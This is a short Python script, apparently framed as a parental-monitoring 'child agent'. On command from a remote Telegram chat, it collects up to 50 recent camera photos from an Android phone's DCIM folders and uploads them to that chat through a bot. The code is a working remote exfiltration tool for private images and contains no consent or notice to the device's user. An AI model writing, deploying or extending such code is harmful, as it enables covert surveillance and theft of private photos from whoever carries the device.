# child.py
import os, json, asyncio
from telethon import TelegramClient, events, Button

# ================= CONFIG =================
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]

# Camera photo folders
MEDIA_DIRS = [
    "/sdcard/DCIM/Camera",
    "/storage/emulated/0/DCIM/Camera"
]
IMAGE_EXTS = (".jpg",".jpeg",".png",".heic",".webp")

# ================= FUNCTIONS =================
def list_media(limit=50):
    files = []
    for base in MEDIA_DIRS:
        if not os.path.exists(base):
            continue
        for root, dirs, filenames in os.walk(base):
            for fn in filenames:
                if fn.lower().endswith(IMAGE_EXTS):
                    path = os.path.join(root, fn)
                    try:
                        mtime = os.path.getmtime(path)
                    except:
                        mtime = 0
                    files.append((mtime, path))
    files.sort(reverse=True)
    return [p for _, p in files[:limit]]

async def send_gallery(client):
    files = list_media(limit=50)
    if not files:
        await client.send_message(CHAT_ID, "No camera photos found.")
        return
    await client.send_message(CHAT_ID, f"Sending {len(files)} recent camera photos:")
    for fpath in files:
        if os.path.exists(fpath):
            try:
                await client.send_file(CHAT_ID, fpath)
            except:
                pass

# ================= MAIN =================
async def main():
    client = TelegramClient('child_session', 12345, '0123456789abcdef0123456789abcdef', bot_token=BOT_TOKEN)
    await client.start(bot_token=BOT_TOKEN)

    # Send device connected message with button
    await client.send_message(
        CHAT_ID,
        "Device connected ✅",
        buttons=[Button.inline("Get Gallery", b"get_gallery")]
    )

    @client.on(events.CallbackQuery)
    async def callback(event):
        if event.sender_id != CHAT_ID:
            return
        if event.data == b"get_gallery":
            await event.answer("Sending gallery...")
            await send_gallery(client)

    print("Child agent online — waiting for parent commands.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
